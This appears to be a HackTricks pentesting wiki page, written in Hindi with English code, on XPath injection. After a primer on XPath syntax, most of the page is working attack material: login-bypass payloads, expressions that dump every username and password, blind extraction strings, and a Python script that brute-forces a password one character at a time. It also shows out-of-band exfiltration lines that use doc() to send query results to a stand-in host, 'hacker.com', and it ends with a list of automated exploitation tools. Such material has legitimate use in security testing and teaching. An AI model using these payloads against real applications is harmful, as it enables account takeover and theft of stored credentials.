# XPATH injection

{{#include ../banners/hacktricks-training.md}}

## Basic Syntax

एक हमले की तकनीक जिसे XPath Injection के रूप में जाना जाता है, का उपयोग उन अनुप्रयोगों का लाभ उठाने के लिए किया जाता है जो उपयोगकर्ता इनपुट के आधार पर XPath (XML Path Language) क्वेरी बनाते हैं ताकि XML दस्तावेजों को क्वेरी या नेविगेट किया जा सके।

### Nodes Described

अभिव्यक्तियों का उपयोग XML दस्तावेज़ में विभिन्न नोड्स का चयन करने के लिए किया जाता है। इन अभिव्यक्तियों और उनके विवरणों का सारांश नीचे दिया गया है:

- **nodename**: "nodename" नाम वाले सभी नोड्स का चयन किया जाता है।
- **/**: चयन मूल नोड से किया जाता है।
- **//**: वर्तमान नोड से चयन से मेल खाने वाले नोड्स का चयन किया जाता है, चाहे वे दस्तावेज़ में किसी भी स्थान पर हों।
- **.**: वर्तमान नोड का चयन किया जाता है।
- **..**: वर्तमान नोड का माता-पिता चयनित किया जाता है।
- **@**: गुणांक का चयन किया जाता है।

### XPath Examples

पथ अभिव्यक्तियों और उनके परिणामों के उदाहरण शामिल हैं:

- **bookstore**: "bookstore" नाम वाले सभी नोड्स का चयन किया जाता है।
- **/bookstore**: मूल तत्व bookstore का चयन किया जाता है। यह नोट किया गया है कि किसी तत्व के लिए एक पूर्ण पथ एक स्लैश (/) से शुरू होने वाले पथ द्वारा दर्शाया जाता है।
- **bookstore/book**: सभी पुस्तक तत्व जो bookstore के बच्चे हैं, का चयन किया जाता है।
- **//book**: दस्तावेज़ में सभी पुस्तक तत्वों का चयन किया जाता है, चाहे उनका स्थान कुछ भी हो।
- **bookstore//book**: सभी पुस्तक तत्व जो bookstore तत्व के वंशज हैं, का चयन किया जाता है, चाहे उनकी स्थिति bookstore तत्व के तहत कुछ भी हो।
- **//@lang**: lang नाम वाले सभी गुणांक का चयन किया जाता है।

### Utilization of Predicates

चयन को परिष्कृत करने के लिए गुणांक का उपयोग किया जाता है:

- **/bookstore/book\[1]**: bookstore तत्व का पहला पुस्तक तत्व बच्चा चयनित किया जाता है। IE संस्करण 5 से 9 के लिए एक वर्कअराउंड, जो पहले नोड को \[0] के रूप में अनुक्रमित करता है, JavaScript के माध्यम से SelectionLanguage को XPath पर सेट करना है।
- **/bookstore/book\[last()]**: bookstore तत्व का अंतिम पुस्तक तत्व बच्चा चयनित किया जाता है।
- **/bookstore/book\[last()-1]**: bookstore तत्व का पूर्व अंतिम पुस्तक तत्व बच्चा चयनित किया जाता है।
- **/bookstore/book\[position()<3]**: bookstore तत्व के पहले दो पुस्तक तत्व बच्चों का चयन किया जाता है।
- **//title\[@lang]**: lang गुणांक वाले सभी शीर्षक तत्वों का चयन किया जाता है।
- **//title\[@lang='en']**: "lang" गुणांक मान "en" वाले सभी शीर्षक तत्वों का चयन किया जाता है।
- **/bookstore/book\[price>35.00]**: bookstore के सभी पुस्तक तत्व जिनकी कीमत 35.00 से अधिक है, का चयन किया जाता है।
- **/bookstore/book\[price>35.00]/title**: bookstore के उन पुस्तक तत्वों के सभी शीर्षक तत्वों का चयन किया जाता है जिनकी कीमत 35.00 से अधिक है।

### Handling of Unknown Nodes

अज्ञात नोड्स से मेल खाने के लिए वाइल्डकार्ड का उपयोग किया जाता है:

- **\***: किसी भी तत्व नोड से मेल खाता है।
- **@**\*: किसी भी गुणांक नोड से मेल खाता है।
- **node()**: किसी भी प्रकार के किसी भी नोड से मेल खाता है।

अधिक उदाहरणों में शामिल हैं:

- **/bookstore/\***: bookstore तत्व के सभी बच्चे तत्व नोड्स का चयन करता है।
- **//\***: दस्तावेज़ में सभी तत्वों का चयन करता है।
- **//title\[@\*]**: किसी भी प्रकार के कम से कम एक गुणांक वाले सभी शीर्षक तत्वों का चयन करता है।

## Example
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### जानकारी तक पहुँचें
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### स्कीमा की पहचान और चोरी
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## प्रमाणीकरण बाईपास

### **क्वेरी का उदाहरण:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **उपयोगकर्ता और पासवर्ड में OR बायपास (दोनों में समान मान)**
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **नल इंजेक्शन का दुरुपयोग**
```
Username: ' or 1]%00
```
### **यूजरनेम या पासवर्ड में डबल OR** (केवल 1 कमजोर फ़ील्ड के साथ मान्य है)

महत्वपूर्ण: ध्यान दें कि **"और" पहली क्रिया है जो की जाती है**।
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2º account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## स्ट्रिंग निष्कर्षण

आउटपुट में स्ट्रिंग्स होती हैं और उपयोगकर्ता मानों को खोजने के लिए हेरफेर कर सकता है:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## ब्लाइंड एक्सप्लोइटेशन

### **किसी मान की लंबाई प्राप्त करें और तुलना द्वारा इसे निकालें:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **पायथन उदाहरण**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### फ़ाइल पढ़ें
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB शोषण
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Automatic tool

- [xcat](https://xcat.readthedocs.io/)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection\_(OTG-INPVAL-010)](<https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)>)
- [https://www.w3schools.com/xml/xpath_syntax.asp](https://www.w3schools.com/xml/xpath_syntax.asp)

{{#include ../banners/hacktricks-training.md}}
